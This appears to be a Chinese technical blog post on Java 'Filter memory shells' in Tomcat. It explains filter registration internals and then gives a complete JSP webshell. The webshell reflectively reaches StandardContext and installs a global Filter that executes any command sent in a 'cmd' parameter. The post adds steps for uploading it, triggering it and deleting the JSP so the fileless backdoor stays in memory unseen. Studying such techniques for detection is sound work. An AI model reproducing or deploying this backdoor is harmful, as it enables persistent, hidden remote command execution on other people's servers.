---
title: "Java 内存马（二）：Filter 内存马"
date: "2025-03-24 20:46:49"
updated: "2026-05-30 19:26:31"
categories: ["文章", "代码审计"]
tags: ["内存马", "Filter"]
thumbnail: "/wp-content/uploads/2025/img-6f3eae56b561.png"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "875"
---
<h2 class="md-end-block md-heading"><span class="md-plain">1. 基本概念</span></h2>
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">Filter（过滤器）</span></strong></span><span class="md-plain"> 是 Java Web 应用中的一个组件，作用是在请求到达 Servlet 前，对请求和响应进行拦截、预处理或后处理。</span></p>
<img class="alignnone size-full wp-image-879" src="/wp-content/uploads/2025/img-6f3eae56b561.png" alt="" width="841" height="291" />
<p class="md-end-block md-p"><span class="md-plain">特点：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">介于 </span><span class="md-pair-s "><strong><span class="md-plain">客户端请求</span></strong></span><span class="md-plain"> 与 </span><span class="md-pair-s "><strong><span class="md-plain">Servlet</span></strong></span><span class="md-plain"> 之间</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">常见用途：认证、日志记录、请求参数处理</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行顺序：请求先经过 Filter → 再传递给 Servlet → 响应可再次经过 Filter</span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Filter 内存马</span></strong></span><span class="md-plain"> 的思路与 Servlet 内存马类似：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用 </span><span class="md-pair-s "><strong><span class="md-plain">运行时动态注册 Filter</span></strong></span><span class="md-plain"> 的能力</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">将恶意 Filter 植入内存</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">所有请求都会经过 Filter，从而实现后门逻辑</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">2. Filter 装载流程（开发者视角）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">2.1 定义 Filter</span></h3>


```
package com.example.memshell;
​
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpFilter;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.IOException;
​
public class MyFilter extends HttpFilter {
    @Override
    protected void doFilter(HttpServletRequest req, HttpServletResponse res,
                            FilterChain chain) throws IOException, ServletException {
        String cmd = req.getParameter("cmd");
        if (cmd != null){
            res.getWriter().println("自定义响应");
        }
        super.doFilter(req, res, chain);
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.2 配置 web.xml</span></h3>


```
<filter>
    <filter-name>MyFilter</filter-name>
    <filter-class>com.example.memshell.MyFilter</filter-class>
</filter>
​
<filter-mapping>
    <filter-name>MyFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.3 Tomcat 加载</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启动时，Tomcat 解析 </span><span class="md-pair-s" spellcheck="false"><code>web.xml</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建并初始化 </span><span class="md-pair-s" spellcheck="false"><code>MyFilter</code></span><span class="md-plain"> 对象</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">根据 </span><span class="md-pair-s" spellcheck="false"><code>&lt;filter-mapping&gt;</code></span><span class="md-plain">，将 </span><span class="md-pair-s" spellcheck="false"><code>/*</code></span><span class="md-plain"> 的请求都交给 </span><span class="md-pair-s" spellcheck="false"><code>MyFilter</code></span><span class="md-plain"> 处理</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">3. Tomcat Filter 加载流程（容器内部机制）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">3.1 Web 应用启动</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Tomcat 在启动时，会调用 </span><span class="md-pair-s" spellcheck="false"><code>ContextConfig#configureStart()</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">除了解析 Servlet，还会解析 Filter 配置</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.2 Filter 定义（FilterDef）</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">每个 Filter 的配置会被解析为 </span><span class="md-pair-s" spellcheck="false"><code>FilterDef</code></span><span class="md-plain"> 对象</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">包含：Filter 名称、类名、实例对象</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.3 Filter 映射（FilterMap）</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>&lt;filter-mapping&gt;</code></span><span class="md-plain"> 对应 </span><span class="md-pair-s" spellcheck="false"><code>FilterMap</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">定义了 Filter 的匹配规则（如 URL pattern、Servlet 名称）</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.4 注册 Filter</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>StandardContext.addFilterDef(def)</code></span><span class="md-plain"> 注册 Filter 定义</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>StandardContext.addFilterMapBefore(map)</code></span><span class="md-plain"> 注册映射</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>standardContext.filterStart()</code></span><span class="md-plain"> 启动 Filter 机制</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">4. 内存马实现机制</span></h2>
<p class="md-end-block md-p"><span class="md-plain">Filter 内存马的实现步骤：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">编写恶意 Filter</span></strong></span><span class="md-plain">（执行命令/响应输出）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取 StandardContext</span></strong></span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>request.getServletContext()</code></span><span class="md-plain"> → 反射逐层获取内部 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">创建 FilterDef（定义）和 FilterMap（映射）</span></strong></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">调用 API 注册到容器</span></strong></span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>addFilterDef()</code></span><span class="md-plain"> → 注册 Filter</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>addFilterMapBefore()</code></span><span class="md-plain"> → 设置 URL 匹配规则</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p md-focus"><span class="md-pair-s" spellcheck="false"><code>filterStart()</code></span><span class="md-plain"> → 激活 Filter</span></p>
</li>
</ul>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">5. 示例代码（JSP Filter 内存马）</span></h2>


```
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="javax.servlet.*, javax.servlet.http.*" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>

<%!
    // 恶意 Filter
    public class ShellFilter implements Filter {
        @Override
        public void init(FilterConfig filterConfig) {}
        @Override
        public void doFilter(ServletRequest req, ServletResponse resp,
                             FilterChain chain) throws IOException, ServletException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process proc = Runtime.getRuntime().exec(cmd);
                BufferedReader br = new BufferedReader(
                        new InputStreamReader(proc.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    resp.getWriter().println(line);
                }
                br.close();
            } else {
                chain.doFilter(req, resp);
            }
        }
        @Override
        public void destroy() {}
    }
%>

<%
    // 1. 获取 StandardContext
    ServletContext servletContext = request.getServletContext();
    Field appCtxField = servletContext.getClass().getDeclaredField("context");
    appCtxField.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext) appCtxField.get(servletContext);

    Field stdCtxField = appCtx.getClass().getDeclaredField("context");
    stdCtxField.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdCtxField.get(appCtx);

    // 2. 创建恶意 Filter 定义
    ShellFilter filter = new ShellFilter();
    FilterDef def = new FilterDef();
    def.setFilter(filter);
    def.setFilterName("filter-shell");
    def.setFilterClass(filter.getClass().getName());

    // 3. 创建 Filter 映射
    FilterMap map = new FilterMap();
    map.addURLPattern("/*");
    map.setFilterName("filter-shell");

    // 4. 注册到容器
    standardContext.addFilterDef(def);
    standardContext.addFilterMapBefore(map);
    standardContext.filterStart();
%>
```


<h2 class="md-end-block md-heading"><span class="md-plain">6. 触发步骤</span></h2>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">上传 JSP 木马至服务器</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问 JSP 文件 → 执行注入逻辑，动态注册 Filter</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">之后的所有请求都会经过恶意 Filter</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">请求带参数 </span><span class="md-pair-s" spellcheck="false"><code>cmd</code></span><span class="md-plain"> → 执行系统命令</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">请求不带参数 → 正常转发到目标 Servlet</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">（可选）删除 JSP 文件，Filter 内存马依然驻留</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">7. 总结</span></h2>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Filter 内存马</span></strong></span><span class="md-plain"> 与 </span><span class="md-pair-s "><strong><span class="md-plain">Servlet 内存马</span></strong></span><span class="md-plain"> 类似，都是利用 Tomcat 的动态注册机制</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">不同点</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Servlet 内存马需要手动绑定一个新 URL</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Filter 内存马则是“全局挂钩”，对所有请求生效（更隐蔽）</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">关键 API</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>addFilterDef()</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>addFilterMapBefore()</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>filterStart()</code></span></p>
</li>
</ul>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">优势</span></strong></span><span class="md-plain md-expand">：由于 Filter 位于请求链前端，可以实现更强的隐藏性和通用性</span></p>
</li>
</ul>
